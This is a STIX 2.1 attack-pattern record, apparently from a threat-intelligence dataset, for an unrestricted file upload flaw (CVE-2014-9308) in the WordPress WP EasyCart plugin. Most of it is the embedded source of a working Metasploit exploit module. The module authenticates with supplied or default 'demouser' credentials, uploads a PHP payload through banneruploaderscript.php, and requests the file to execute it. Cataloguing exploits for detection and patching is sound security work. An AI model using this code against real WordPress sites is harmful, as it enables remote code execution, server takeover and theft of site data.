{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c8ee9a4-3b7d-40d8-a9d2-fdf3740213a2",
    "created": "2024-08-14T17:12:34.647217Z",
    "modified": "2024-08-14T17:12:34.647221Z",
    "name": "WordPress WP EasyCart Unrestricted File Upload",
    "description": "WordPress Shopping Cart (WP EasyCart) Plugin for WordPress contains a flaw that allows a remote attacker to execute arbitrary PHP code. This flaw exists because the /inc/amfphp/administration/banneruploaderscript.php script does not properly verify or sanitize user-uploaded files. By uploading a .php file the remote system will place the file in a user-accessible path. Making a direct request to the uploaded file will allow the attacker to execute the script with the privileges of the web server.  In versions <= 3.0.8 authentication can be done by using the WordPress credentials of a user with any role. In later versions, a valid EasyCart admin password will be required that is in use by any admin user. A default installation of EasyCart will setup a user called \"demouser\" with a preset password of \"demouser\". 'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_easycart_unrestricted_file_upload.rb",
            "external_id": "wp_easycart_unrestricted_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9308"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7745"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress WP EasyCart Unrestricted File Upload',\n      'Description'     => %q{WordPress Shopping Cart (WP EasyCart) Plugin for\n                              WordPress contains a flaw that allows a remote\n                              attacker to execute arbitrary PHP code. This\n                              flaw exists because the\n                              /inc/amfphp/administration/banneruploaderscript.php\n                              script does not properly verify or sanitize\n                              user-uploaded files. By uploading a .php file,\n                              the remote system will place the file in a\n                              user-accessible path. Making a direct request to\n                              the uploaded file will allow the attacker to\n                              execute the script with the privileges of the web\n                              server.\n\n                              In versions <= 3.0.8 authentication can be done by\n                              using the WordPress credentials of a user with any\n                              role. In later versions, a valid EasyCart admin\n                              password will be required that is in use by any\n                              admin user. A default installation of EasyCart will\n                              setup a user called \"demouser\" with a preset password\n                              of \"demouser\".},\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Kacper Szurek', # Vulnerability disclosure\n          'rastating'      # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2014-9308'],\n          ['OSVDB', '116806'],\n          ['WPVDB', '7745']\n        ],\n      'DisclosureDate'  => '2015-01-08',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['wp-easycart', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'The WordPress username to authenticate with (versions <= 3.0.8)']),\n        OptString.new('PASSWORD', [false, 'The WordPress password to authenticate with (versions <= 3.0.8)']),\n        OptString.new('EC_PASSWORD', [false, 'The EasyCart password to authenticate with (versions <= 3.0.18)', 'demouser']),\n        OptBool.new('EC_PASSWORD_IS_HASH', [false, 'Indicates whether or not EC_PASSWORD is an MD5 hash', false])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def ec_password\n    datastore['EC_PASSWORD']\n  end\n\n  def ec_password_is_hash\n    datastore['EC_PASSWORD_IS_HASH']\n  end\n\n  def use_wordpress_authentication\n    username.to_s != '' && password.to_s != ''\n  end\n\n  def use_ec_authentication\n    ec_password.to_s != ''\n  end\n\n  def req_id\n    if ec_password_is_hash\n      return ec_password\n    else\n      return Rex::Text.md5(ec_password)\n    end\n  end\n\n  def generate_mime_message(payload, date_hash, name, include_req_id)\n    data = Rex::MIME::Message.new\n    data.add_part(date_hash, nil, nil, 'form-data; name=\"datemd5\"')\n    data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{name}\\\"\")\n    data.add_part(req_id, nil, nil, 'form-data; name=\"reqID\"') if include_req_id\n    data\n  end\n\n  def setup\n    if !use_wordpress_authentication && !use_ec_authentication\n      fail_with(Failure::BadConfig, 'You must set either the USERNAME and PASSWORD options or specify an EC_PASSWORD value')\n    end\n\n    super\n  end\n\n  def exploit\n    vprint_status(\"WordPress authentication attack is enabled\") if use_wordpress_authentication\n    vprint_status(\"EC authentication attack is enabled\") if use_ec_authentication\n\n    if use_wordpress_authentication && use_ec_authentication\n      print_status(\"Both EasyCart and WordPress credentials were supplied, attempting WordPress first...\")\n    end\n\n    if use_wordpress_authentication\n      print_status(\"Authenticating using #{username}:#{password}...\")\n      cookie = wordpress_login(username, password)\n\n      if !cookie\n        if use_ec_authentication\n          print_warning(\"Failed to authenticate with WordPress, attempting upload with EC password next...\")\n        else\n          fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress')\n        end\n      else\n        print_good(\"Authenticated with WordPress\")\n        store_valid_credential(user: username, private: password, proof: cookie)\n      end\n    end\n\n    print_status(\"Preparing payload...\")\n    payload_name = Rex::Text.rand_text_alpha(10)\n    date_hash = Rex::Text.md5(Time.now.to_s)\n    uploaded_filename = \"#{payload_name}_#{date_hash}.php\"\n    plugin_url = normalize_uri(wordpress_url_plugins, 'wp-easycart')\n    uploader_url = normalize_uri(plugin_url, 'inc', 'amfphp', 'administration', 'banneruploaderscript.php')\n    payload_url = normalize_uri(plugin_url, 'products', 'banners', uploaded_filename)\n    data = generate_mime_message(payload, date_hash, \"#{payload_name}.php\", use_ec_authentication)\n\n    print_status(\"Uploading payload to #{payload_url}\")\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => uploader_url,\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => data.to_s,\n      'cookie'  => cookie\n    )\n\n    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?\n    vprint_error(\"Server responded with status code #{res.code}\") if res.code != 200\n\n    print_status(\"Executing the payload...\")\n    register_files_for_cleanup(uploaded_filename)\n    res = send_request_cgi(\n    {\n      'uri'     => payload_url,\n      'method'  => 'GET'\n    }, 5)\n\n    if !res.nil? && res.code == 404\n      print_error(\"Failed to upload the payload\")\n    else\n      print_good(\"Executed payload\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-08",
    "x_mitre_platforms": [
        "php'"
    ]
}